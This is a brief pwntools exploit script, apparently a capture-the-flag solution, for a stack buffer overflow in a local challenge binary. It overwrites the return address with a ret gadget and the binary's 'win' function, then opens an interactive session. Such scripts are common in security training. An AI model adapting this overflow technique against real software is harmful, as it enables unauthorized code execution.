from pwn import *
from binascii import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

# 0x4011ad = ret
# for stack alignment
p.sendline(b"a"*40 + p64(0x4011ad)+p64(e.sym.win))
p.interactive()
